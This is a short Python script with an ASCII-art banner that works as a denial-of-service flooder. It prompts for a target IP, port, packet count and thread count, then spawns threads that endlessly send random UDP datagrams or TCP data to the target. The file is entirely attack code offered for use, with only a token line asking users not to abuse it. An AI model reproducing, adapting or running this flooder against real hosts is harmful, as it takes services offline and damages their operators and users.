#Author : Xalbalador
import random
import socket
import threading
import os,sys

os.system("clear")
print("""

██╗░░██╗███████╗████████╗██╗░░░██╗░░░░░██╗██╗░░░██╗
██║░██╔╝██╔════╝╚══██╔══╝██║░░░██║░░░░░██║██║░░░██║
█████═╝░█████╗░░░░░██║░░░██║░░░██║░░░░░██║██║░░░██║
██╔═██╗░██╔══╝░░░░░██║░░░██║░░░██║██╗░░██║██║░░░██║
██║░╚██╗███████╗░░░██║░░░╚██████╔╝╚█████╔╝╚██████╔╝
╚═╝░░╚═╝╚══════╝░░░╚═╝░░░░╚═════╝░░╚════╝░░╚═════╝░""")
print("DONT ABUSE YA SAYANK SAYANK KU")

ip = str(input(" Target IP :"))
port = int(input(" Target Port :"))
choice = str(input(" GAS MANIEZ? (y/n) : "))
times = int(input(" Packets : "))
threads = int(input(" Threads: "))

os.system("clear")
def run():
	data = random._urandom(2000)
	i = random.choice(("[^]","[•]","[!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" ZIEL ATTACKING TO + ip + port")
		except:
			print("[X] AMFUN SAYANK")

def run2():
	data = random._urandom(16)
	i = random.choice(("[^]","[•]","[!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" ZIEL ATTACKING TO + ip + port!")
		except:
			s.close()
			print("[X] AMFUN SAYANK")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
